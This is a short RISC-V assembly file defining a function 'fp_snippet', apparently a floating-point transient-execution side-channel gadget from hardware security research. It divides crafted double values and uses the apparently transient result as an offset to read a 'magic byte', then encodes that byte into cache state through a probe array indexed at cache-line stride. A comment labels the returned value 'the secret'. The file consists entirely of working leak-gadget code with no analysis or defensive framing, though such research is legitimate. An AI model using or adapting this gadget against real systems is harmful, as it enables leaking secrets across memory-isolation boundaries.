#include "defines.h"

#define ALT_X_VAL     0x0010DEADBEEF1337
#define ALT_Y_VAL     0x40F0000000000000
#define ALT_RES_ARCH  0x00000010DEADBEEF
#define ALT_RES_TRAN  0x3F10DEADBEEF1337
#define X_VAL   0x0010000000000000
#define Y_VAL   0x4340000000000000

.section .text
.global fp_snippet
fp_snippet:
// ; stack management {
    addi    sp,sp,-16
    sd	    s0,8(sp)
// ; }
    la t0, control
    li t1, ADDR_MASK
    
    fmv.d.x f0, a1 // x 
    fmv.d.x f1, a2 // y
    fdiv.d f2, f0, f1 // x/y = trans result ---> real result
    fmv.x.d t2, f2 // f2 = result

    and t2, t2, t1 // retain the first few bytes
    add t0, t0, t2 // offset from control to fetch the magic byte

reload:
    lb t3, 0(t0)   // read the magic byte
    sll t4, t3, 6  // access the array provided
    add a0, a0, t4
    lb t4, 0(a0)

return:
    addi a0, t3, 0  // return the magic byte (or the secret)
reset_stack:
    addi	s0,sp,16
    ld	  s0,8(sp)
    addi	sp,sp,16
    ret

